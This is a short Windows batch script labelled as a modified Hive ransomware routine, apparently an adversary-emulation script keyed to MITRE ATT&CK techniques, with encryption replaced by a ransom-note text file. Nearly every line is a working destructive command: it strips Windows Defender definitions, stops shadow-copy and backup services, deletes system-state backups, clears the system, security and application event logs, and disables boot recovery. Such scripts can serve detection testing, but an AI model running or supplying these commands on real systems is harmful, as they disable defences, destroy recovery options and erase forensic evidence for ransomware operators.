
::HIVE RANSOMEWARE MODIFIED
cls

::T1562.001 CAN'T BE UTILIZED IF WINDOWS DEFENDER IS DISABLED 
::powershell.exe Set-MpPreference -DisableRealtimeMonitoring $True -DisableIntrusionPreventionSystem $True -DisableIOAVProtection $True -DisableScriptScanning $True -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting 0 -SubmitSamplesConsent 2

::T1562.001 replacement 
cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

::T1489
cmd.exe /c sc stop LanmanWorkstation
cmd.exe /c sc stop SamSs
cmd.exe /c sc stop SDRSVC
cmd.exe /c sc stop SstpSVc
cmd.exe /c sc stop UI0Detect
cmd.exe /c sc stop Vmicvss
cmd.exe /c sc stop Vmss
cmd.exe /c sc stop VSS
cmd.exe /c sc stop Wbengine
cmd.exe /c sc stop Unistoresvc

::T1047 errors with T1490 if ran
::cmd wmic.exe SHADOWCOPY /nointeractive
::T1490 errors with T1047 if ran
::cmd wmic.exe shadowcopy delete

::T1047 substitute
cmd.exe /c wmic process get caption,executablepath,commandline /format:csv

::T1490 subsitute
cmd.exe /c wbadmin delete systemstatebackup -keepVersions:0

::T1070.001
cmd.exe /c wevtutil.exe cl system
cmd.exe /c wevtutil.exe cl security
cmd.exe /c wevtutil.exe cl application

::T1490 (needs cmdadmin)
cmd.exe /c bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
cmd.exe /c bcdedit.exe /set {default} recoveryenabled no

::Ransomeware substitute 
cmd.exe /c echo You have been infected by Hive Ransomware. > Hive.txt
cmd.exe /c Hive.txt